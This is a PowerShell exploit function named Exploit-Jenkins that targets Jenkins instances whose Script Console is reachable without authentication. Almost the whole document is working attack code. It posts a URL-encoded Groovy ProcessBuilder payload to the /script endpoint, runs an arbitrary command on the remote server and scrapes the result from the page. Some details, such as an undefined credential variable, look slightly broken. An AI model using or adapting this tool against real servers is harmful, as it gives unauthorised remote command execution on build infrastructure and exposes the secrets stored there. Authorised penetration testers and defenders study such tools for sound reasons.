 function Exploit-Jenkins() {
    <#
    .SYNOPSIS
        PowerShell delivery for unauthenticated access to Jenkins Script Console
        
    .PARAMETER Rhost.
        Host to exploit

    .PARAMETER Port
        Port to use.

    .PARAMETER Cmd
        Command to run on remote Jenkins Script Console

    .EXAMPLE
        Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd whoami
        Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd "cmd /c netstat -an"

    .LINK
        http://twitter.com/luxcupitor
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [string] $Rhost,
        [Parameter(Mandatory=$True)]
        [string] $Cmd,
        [Parameter(Mandatory=$False)]
        [Int] $Port
    )
 Add-Type -Assembly System.Web
 $url = "http://"+$($Rhost)+":"+$($Port)+"/script"
 
 $cookiejar = New-Object System.Net.CookieContainer
 $Cmd = $Cmd -replace "\s","','"
 $Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)
 # Login
 $webrequest = [System.Net.HTTPWebRequest]::Create($url);
 $webrequest.CookieContainer = New-Object System.Net.CookieContainer;
 $webrequest.Method = "GET"
 $webrequest.Credentials = $credCache
 if ($cookiejar -ne $null) { $webrequest.CookieContainer = $cookiejar }
 $response = $webrequest.GetResponse()
 $responseStream = $response.GetResponseStream()
 $streamReader = New-Object System.IO.Streamreader($responseStream)
 $output = $streamReader.ReadToEnd()
 

 $postdata="script=println+new+ProcessBuilder%28%27"+$($Cmd)+"%27%29.redirectErrorStream%28true%29.start%28%29.text&Submit=Run"
 $bytearray = [System.Text.Encoding]::UTF8.GetBytes($postdata)
 
 # Second request
 $webrequest = [System.Net.HTTPWebRequest]::Create($url)
 $webrequest.Credentials = $credCache
 if ($cookiejar -ne $null) { $webrequest.CookieContainer=$cookiejar }
 $webrequest.Method = "POST"
 $webrequest.ContentType = "application/x-www-form-urlencoded"
 $webrequest.ContentLength = $bytearray.Length
 $requestStream = $webrequest.GetRequestStream()
 
 # Post data
 $requestStream.Write($bytearray, 0, $bytearray.Length)
 $requestStream.Close()
 $response = $webrequest.GetResponse()
 $responseStream  = $response.GetResponseStream()
 
 # Get Response
 $streamReader = New-Object System.IO.Streamreader($responseStream)
 $output = $streamReader.ReadToEnd()
 $null = $output -match "Result</h2><pre>((?si).+?)</pre>"
 #Write-Output $matches[1]
 #return $output
 return $matches[1]
 }
